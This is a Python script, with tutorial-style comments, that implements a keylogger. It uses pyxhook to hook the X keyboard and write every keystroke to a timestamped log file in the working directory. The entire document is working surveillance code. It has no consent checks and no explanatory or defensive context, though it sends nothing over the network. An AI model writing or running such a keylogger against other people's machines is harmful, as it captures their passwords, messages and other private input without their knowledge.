# import needed modules
import os
from datetime import datetime
import pyxhook

# main function
def main():
    # specify the name of the file (can be changed )
    log_file = f'{os.getcwd()}/{datetime.now().strftime("%d-%m-%Y|%H:%M")}.log'

    # the logging function with {event parm}
    def OnKeyPress(event):

        with open(log_file, "a") as f:  # open a file as f with Append (a) mode
            if event.Key == 'P_Enter' :
                f.write('\n')
            else:
                f.write(f"{chr(event.Ascii)}")  # write to the file / convert ascii to readable characters

    # create a hook manager object
    new_hook = pyxhook.HookManager()
    new_hook.KeyDown = OnKeyPress

    new_hook.HookKeyboard()  # set the hook

    try:
        new_hook.start()  # start the hook
    except KeyboardInterrupt:
        # User cancelled from command line.
        pass
    except Exception as ex:
        # Write exceptions to the log file, for analysis later.
        msg = f"Error while catching events:\n  {ex}"
        pyxhook.print_err(msg)
        with open(log_file, "a") as f:
            f.write(f"\n{msg}")


if __name__ == "__main__":
    main()
